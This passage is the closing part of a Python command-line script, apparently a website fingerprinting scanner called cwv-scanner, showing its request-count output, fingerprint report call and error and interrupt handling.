        print(f"Total requests made: {scanner.requests_count}")
        
        if pages:
            reporter.display_fingerprint(scanner, pages[0], args.target, args)

    except RuntimeError as e:
        if "Max requests exceeded" in str(e):
            print(f"\nMax request limit ({args.max_requests}) reached, stopping scan early.")
        else:
            print(f"\nError: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n" + Fore.YELLOW + "Scan interrupted. Thank you for using cwv-scanner by SirCryptic!" + Style.RESET_ALL)
        sys.exit(0)

if __name__ == "__main__":
    main()
